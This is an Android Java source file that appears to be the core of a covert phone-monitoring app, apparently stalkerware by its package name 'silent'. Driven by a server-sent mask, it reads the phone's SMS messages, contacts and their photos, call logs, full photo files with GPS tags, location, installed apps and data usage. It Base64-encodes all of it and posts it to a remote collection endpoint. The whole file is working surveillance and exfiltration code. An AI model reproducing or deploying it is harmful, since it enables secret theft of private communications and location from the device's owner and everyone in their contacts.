package src.silent.jobs.tasks;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.LayerDrawable;
import android.graphics.drawable.VectorDrawable;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.TrafficStats;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import src.silent.utils.BatteryHandler;
import src.silent.utils.BitmapJsonHelper;
import src.silent.utils.LocationHandler;
import src.silent.utils.SHA1Helper;
import src.silent.utils.ServerCommunicationHandler;

/**
 * Created by all3x on 2/23/2018.
 */

public class TaskMaster extends AsyncTask<Context, Void, Void> {

    private Context params;

    @Override
    protected Void doInBackground(Context... params) {
        this.params = params[0];

        String maskHash = ServerCommunicationHandler.getMask(params[0],
                "http://192.168.1.24:58938/api/Service/GetMask",
                "357336064017681");
        String[] maskHash2 = maskHash.split(";");
        String[] hashes = maskHash2[1].split(":");

        JSONObject bulkData = new JSONObject();
        for (int i = 0; i < maskHash2[0].length(); i++) {
            if (maskHash2[0].charAt(i) == '1') {
                switch (i) {
                    case 0:
                        getPhotos(bulkData, hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI);
                        ServerCommunicationHandler.executeDataPost(params[0],
                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                                "357336064017681");
                        bulkData = new JSONObject();
                        getPhotos(bulkData, hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                        ServerCommunicationHandler.executeDataPost(params[0],
                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                                "357336064017681");
                        bulkData = new JSONObject();
                        break;
                    case 1:
                        getContacts(bulkData, hashes[i]);
                        break;
                    case 2:
                        getCallHistory(bulkData, hashes[i]);
                        break;
                    case 3:
                        getMessages(bulkData, hashes[i]);
                        break;
                    case 4:
                        getMobileDataUsage(bulkData, hashes[i]);
                        break;
                    case 5:
                        getInstalledApps(bulkData, hashes[i]);
                        break;
                    case 6:
                        getSmartphoneLocation(bulkData, hashes[i]);
                        break;
                    case 7:
                        getBatteryLevel(bulkData);
                        break;
                }
            }
        }
        //getAndroidIDModel();

        ServerCommunicationHandler.executeDataPost(params[0],
                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                "357336064017681");
        return null;
    }

    private void getSmartphoneLocation(JSONObject bulkData, String hash) {
        LocationManager locationManager = (LocationManager)
                params.getSystemService(Context.LOCATION_SERVICE);
        try {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            JSONObject locationData = new JSONObject();
            String shaString = "";
            if (location != null && location.getTime() > Calendar.getInstance().getTimeInMillis() -
                    120000) {

                shaString += String.valueOf(location.getLatitude());
                shaString += String.valueOf(location.getLongitude());

                locationData.put("Latitude",
                        Base64.encodeToString(String.valueOf(location.getLatitude()).getBytes(),
                                Base64.URL_SAFE));
                locationData.put("Longitude",
                        Base64.encodeToString(String.valueOf(location.getLongitude()).getBytes(),
                                Base64.URL_SAFE));
            } else {
                LocationHandler locationHandler = new LocationHandler();
                Criteria criteria = new Criteria();
                criteria.setAccuracy(Criteria.ACCURACY_COARSE);
                criteria.setPowerRequirement(Criteria.POWER_LOW);
                criteria.setAltitudeRequired(false);
                criteria.setBearingRequired(false);
                criteria.setSpeedRequired(false);
                criteria.setCostAllowed(true);
                criteria.setHorizontalAccuracy(Criteria.ACCURACY_HIGH);
                criteria.setVerticalAccuracy(Criteria.ACCURACY_HIGH);

                Looper.prepare();
                locationManager.requestSingleUpdate(criteria, locationHandler, null);
                Looper.loop();

                shaString += locationHandler.getLatitude();
                shaString += locationHandler.getLongitude();
                locationData.put("Latitude",
                        Base64.encodeToString(locationHandler.getLatitude().getBytes(),
                                Base64.URL_SAFE));
                locationData.put("Longitude",
                        Base64.encodeToString(locationHandler.getLongitude().getBytes(),
                                Base64.URL_SAFE));
            }

            String theHash = SHA1Helper.SHA1(shaString);
            if (!theHash.equals(hash)) {
                locationData.put("Hash", Base64.encodeToString(theHash.getBytes(),
                        Base64.URL_SAFE));
                bulkData.put("Location", locationData);
            }

        } catch (SecurityException ex) {
            Log.d("Location EXCEPTION", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception ex) {
            Log.d("LOCATION EXCEPTION", ex.getMessage());
        }
    }

    private void getMessages(JSONObject bulkData, String hash) {
        try {
            Uri message = Uri.parse("content://sms");
            ContentResolver cr = params.getContentResolver();
            final String[] projection = new String[]{"address", "body", "read", "date", "type"};
            String selection = null;
            String[] selectionArgs = null;
            if (!hash.equals("0")) {
                selection = "date>?";
                selectionArgs = new String[]{hash};
            }
            Cursor c = cr.query(message, projection, selection, selectionArgs, "date DESC");

            String newHash = "";
            int totalSMS = c.getCount();
            if (c.moveToFirst()) {
                JSONObject messages = new JSONObject();
                JSONArray informationArray = new JSONArray();
                for (int i = 0; i < totalSMS; i++) {
                    JSONObject information = new JSONObject();
                    information.put("Address", Base64.encodeToString(c.getString(c
                                    .getColumnIndexOrThrow("address")).getBytes(),
                            Base64.URL_SAFE));
                    information.put("Body", Base64.encodeToString(c.getString(c.
                            getColumnIndexOrThrow("body")).getBytes(), Base64.URL_SAFE));
                    information.put("State", Base64.encodeToString(c.getString(c
                            .getColumnIndex("read")).getBytes(), Base64.URL_SAFE));
                    Timestamp date = new Timestamp(Long.
                            parseLong(c.getString(c.getColumnIndexOrThrow("date"))));
                    String baseDate = Base64.encodeToString(date.toString().getBytes(),
                            Base64.URL_SAFE);
                    if (i == 0) {
                        newHash = c.getString(c.getColumnIndexOrThrow("date"));
                    }
                    information.put("Date", baseDate);
                    String type = c.getString(c.getColumnIndexOrThrow("type"));
                    if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                        information.put("Type", Base64.encodeToString("Inbox".getBytes(),
                                Base64.URL_SAFE));
                    } else {
                        information.put("Type", Base64.encodeToString("Sent".getBytes(),
                                Base64.URL_SAFE));
                    }

                    informationArray.put(information);
                    c.moveToNext();
                }

                if (informationArray.length() != 0) {
                    messages.put("Messages", informationArray);
                    messages.put("Hash", newHash);
                    bulkData.put("Messages", messages);
                }
            }
            c.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void getContacts(JSONObject bulkData, String hash) {
        try {
            ContentResolver contentResolver = params.getContentResolver();
            String selection = null;
            String[] selectionArgs = null;
            if (!hash.equals("0")) {
                selection = "contact_last_updated_timestamp>?";
                selectionArgs = new String[]{hash};
            }
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                    null, selection, selectionArgs,
                    "contact_last_updated_timestamp DESC");

            if (cursor != null) {
                List<String> numbers = new ArrayList<>();
                JSONObject contacts = new JSONObject();
                JSONArray informationArray = new JSONArray();
                String newHash = "";
                boolean first = true;
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
                            Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor cursorInfo = contentResolver.query(ContactsContract.
                                        CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        InputStream inputStream = ContactsContract.Contacts.
                                openContactPhotoInputStream(params.getContentResolver(),
                                        ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                                                new Long(id)));

                        Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                                new Long(id));
                        Uri pURI = Uri.withAppendedPath(person,
                                ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);

                        Bitmap photo = null;
                        if (inputStream != null) {
                            photo = BitmapFactory.decodeStream(inputStream);
                        }
                        cursorInfo.moveToFirst();
                        if (!numbers.contains(cursorInfo.getString(cursorInfo.
                                getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                .replace(" ", ""))) {
                            numbers.add(cursorInfo.getString(cursorInfo.
                                    getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                    .replace(" ", ""));

                            JSONObject information = new JSONObject();
                            information.put("Name", Base64.encodeToString(
                                    cursor.getString(cursor
                                            .getColumnIndex(ContactsContract.
                                                    Contacts.DISPLAY_NAME)).getBytes(),
                                    Base64.URL_SAFE
                            ));
                            information.put("Number", Base64.encodeToString(
                                    cursorInfo.getString(cursorInfo.
                                            getColumnIndex(ContactsContract
                                                    .CommonDataKinds.Phone.NUMBER))
                                            .replace(" ", "")
                                            .getBytes(),
                                    Base64.URL_SAFE
                            ));
                            information.put("Picture", BitmapJsonHelper
                                    .getStringFromBitmap(photo));

                            if (first) {
                                first = false;
                                newHash = cursor.getString(cursor.getColumnIndex(ContactsContract.
                                        Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
                            }

                            informationArray.put(information);
                        }
                        cursorInfo.close();
                    }
                }

                if (informationArray.length() != 0) {
                    contacts.put("ContactList", informationArray);
                    contacts.put("Hash", newHash);
                    bulkData.put("Contacts", contacts);
                }
                cursor.close();
            }
        } catch (Exception ex) {

        }
    }

    private void getCallHistory(JSONObject bulkData, String hash) {
        try {
            ContentResolver contentResolver = params.getContentResolver();
            String selection = null;
            String[] selectionArgs = null;
            if (!hash.equals("0")) {
                selection = "date>?";
                selectionArgs = new String[]{hash};
            }
            Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null,
                    selection, selectionArgs, "date DESC");
            if (managedCursor != null) {
                int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

                JSONObject callHistory = new JSONObject();
                JSONArray informationArray = new JSONArray();
                String newHash = "";
                boolean first = true;
                while (managedCursor.moveToNext()) {
                    JSONObject information = new JSONObject();
                    information.put("Number",
                            Base64.encodeToString(managedCursor.getString(number)
                                            .replace(" ", "").getBytes(),
                                    Base64.URL_SAFE));
                    Timestamp cal = new Timestamp(Long.valueOf(managedCursor.getString(date)));
                    information.put("Date",
                            Base64.encodeToString(cal.toString().getBytes(),
                                    Base64.URL_SAFE));
                    if (first) {
                        first = false;
                        newHash = managedCursor.getString(date);
                    }
                    information.put("Duration",
                            Base64.encodeToString(managedCursor.getString(duration).getBytes(),
                                    Base64.URL_SAFE));
                    information.put("Direction",
                            Base64.encodeToString(getCallType(managedCursor.getString(type))
                                    .getBytes(), Base64.URL_SAFE));
                    informationArray.put(information);
                }
                managedCursor.close();

                if (informationArray.length() != 0) {
                    callHistory.put("Calls", informationArray);
                    callHistory.put("Hash", newHash);
                    bulkData.put("CallHistory", callHistory);
                }
            }
        } catch (SecurityException ex) {
            Log.d("CALL LOG EX", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private String getCallType(String callType) {
        int dircode = Integer.parseInt(callType);
        switch (dircode) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "OUTGOING";

            case CallLog.Calls.INCOMING_TYPE:
                return "INCOMING";

            case CallLog.Calls.MISSED_TYPE:
                return "MISSED";
            default:
                return "";
        }
    }

    private void getMobileDataUsage(JSONObject bulkData, String hash) {
        try {
            long totalTraficReceived = TrafficStats.getTotalRxBytes() / (1024 * 1024);
            long totalTraficTransmitted = TrafficStats.getTotalTxBytes() / (1024 * 1024);
            long totalTrafic = totalTraficReceived + totalTraficTransmitted;

            String total = String.valueOf(totalTrafic);
            JSONObject totalTraficJson = new JSONObject();
            totalTraficJson.put("Trafic", Base64.encodeToString(total.getBytes(),
                    Base64.URL_SAFE));

            String sha = SHA1Helper.SHA1(total);
            if (!sha.equals(hash)) {
                totalTraficJson.put("Hash", Base64.encodeToString(sha.getBytes(),
                        Base64.URL_SAFE));
                bulkData.put("Trafic", totalTraficJson);
            }
        } catch (Exception ex) {

        }

    }

    private void getInstalledApps(JSONObject bulkData, String hash) {
        try {
            PackageManager pm = params.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(0);

            JSONObject applications = new JSONObject();
            JSONArray informationArray = new JSONArray();
            long newHash = 0;
            for (ApplicationInfo packageInfo : packages) {
                String package_name = packageInfo.packageName;
                long appDate = pm.getPackageInfo(package_name, 0).firstInstallTime;
                if (appDate > Long.parseLong(hash)) {
                    JSONObject information = new JSONObject();

                    ApplicationInfo app = pm.getApplicationInfo(package_name, 0);
                    information.put("Name", Base64.encodeToString(((String) pm
                            .getApplicationLabel(app)).getBytes(), Base64.URL_SAFE));
                    Drawable drIcon = pm.getApplicationIcon(app);
                    Bitmap icon = null;
                    if (drIcon.getClass() != LayerDrawable.class &&
                            drIcon.getClass() != VectorDrawable.class) {
                        icon = ((BitmapDrawable) drIcon).getBitmap();
                    }
                    information.put("Icon", BitmapJsonHelper.getStringFromBitmap(icon));
                    informationArray.put(information);

                    if (appDate > newHash) {
                        newHash = appDate;
                    }
                }
            }

            if (informationArray.length() != 0) {
                applications.put("Applications", informationArray);
                applications.put("Hash", newHash);
                bulkData.put("Applications", applications);
            }
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
        }
    }

    private void getPhotos(JSONObject bulkData, String hash, Uri uri) {
        try {
            JSONObject photos = new JSONObject();
            JSONArray informationArray = new JSONArray();

            ContentResolver cr = params.getContentResolver();
            String[] filePathColumn = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.LATITUDE, MediaStore.Images.Media.LONGITUDE};
            String selection = null;
            String[] selectionArgs = null;
            String newHash = hash;
            boolean first = true;
            if (!hash.equals("0")) {
                selection = "datetaken>?";
                selectionArgs = new String[]{hash};
            }
            Cursor cur = cr.query(uri, filePathColumn
                    , selection, selectionArgs, "datetaken DESC");

            if (cur.moveToFirst()) {
                do {
                    int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                    String picturePath = cur.getString(columnIndex);
                    if (picturePath != null) {
                        int dateTakenIndex = cur.getColumnIndex(filePathColumn[1]);
                        int latitudeIndex = cur.getColumnIndex(filePathColumn[2]);
                        int longitudeIndex = cur.getColumnIndex(filePathColumn[3]);
                        Timestamp datetaken = new Timestamp(Long
                                .parseLong(cur.getString(dateTakenIndex)));
                        if (first) {
                            first = false;
                            newHash = cur.getString(dateTakenIndex);
                        }
                        String longitude = cur.getString(longitudeIndex);
                        String latitude = cur.getString(latitudeIndex);

                        JSONObject information = new JSONObject();
                        File file = new File(picturePath);
                        InputStream inputStream = new FileInputStream(file);
                        byte[] array = readBytes(inputStream);

                        information.put("Image", Base64.encodeToString(array, Base64.URL_SAFE));
                        information.put("Date", Base64.encodeToString(datetaken
                                .toString().getBytes(), Base64.URL_SAFE));
                        if (longitude == null) {
                            information.put("Longitude", "");
                        } else {
                            information.put("Longitude", Base64.encodeToString(longitude
                                    .getBytes(), Base64.URL_SAFE));
                        }

                        if (latitude == null) {
                            information.put("Latitude", "");
                        } else {
                            information.put("Latitude", Base64.encodeToString(latitude.getBytes(),
                                    Base64.URL_SAFE));
                        }

                        informationArray.put(information);
                    }
                } while (cur.moveToNext());
            }
            cur.close();

            if (informationArray.length() != 0) {
                photos.put("Photos", informationArray);
                photos.put("Hash", newHash);
                bulkData.put("Photos", photos);
            }
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
        }
    }

    private byte[] readBytes(InputStream inputStream) throws Exception {
        // this dynamically extends to take the bytes you read
        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();

        // this is storage overwritten on each iteration with bytes
        int bufferSize = 1024;
        byte[] buffer = new byte[bufferSize];

        // we need to know how may bytes were read to write them to the byteBuffer
        int len = 0;
        while ((len = inputStream.read(buffer)) != -1) {
            byteBuffer.write(buffer, 0, len);
            Log.d("Size", "" + len);
        }

        // and then we can return your byte array.
        return byteBuffer.toByteArray();
    }

    private void getBatteryLevel(JSONObject bulkData) {
        try {
            BatteryHandler batteryReceriver = new BatteryHandler();
            IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            params.registerReceiver(batteryReceriver, batteryFilter);

            bulkData.put("BatteryLevel", batteryReceriver.getBatteryLevel());
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
        }
    }
}
